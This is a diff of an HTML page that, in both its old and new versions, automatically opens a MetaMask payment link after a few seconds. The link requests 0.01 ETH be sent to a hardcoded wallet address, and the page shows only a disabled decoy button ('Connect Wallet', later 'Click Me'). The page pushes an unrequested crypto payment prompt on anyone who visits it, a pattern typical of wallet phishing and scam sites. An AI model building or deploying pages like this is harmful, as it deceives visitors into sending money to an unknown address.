@@ -1,11 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Trigger Metamask Link</title>
+    <title>Open Metamask Link</title>
     <style>
-        /* Style for the button */
+        /* Style for the static button */
         .metamask-button {
             position: fixed;
             bottom: 20px;
@@ -15,23 +13,26 @@
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
+            pointer-events: none; /* Disable click events */
         }
     </style>
 </head>
 <body>
-    <!-- JavaScript to redirect to Metamask link after 4 seconds -->
+
+    <button class="metamask-button" id="metamask-button">Click Me</button>
+
     <script>
-        function redirectToMetamaskLink() {
-            // Replace this URL with your Metamask link
-            var metamaskLink = "https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16";
-            window.location.href = metamaskLink;
+        // Function to open Metamask link
+        function openMetamaskLink() {
+            window.open('https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16');
         }
 
-        // Automatically trigger the redirection after 4 seconds
-        setTimeout(redirectToMetamaskLink, 4000); // 4000 milliseconds = 4 seconds
+        // Automatically open the Metamask link after 3 seconds
+        setTimeout(openMetamaskLink, 3000); // 3000 milliseconds = 3 seconds
+
+        // Disable the button so it's not clickable
+        document.getElementById('metamask-button').disabled = true;
     </script>
 
-    <!-- Static "Connect Wallet" button -->
-    <button class="metamask-button" disabled>Connect Wallet</button>
 </body>
 </html>
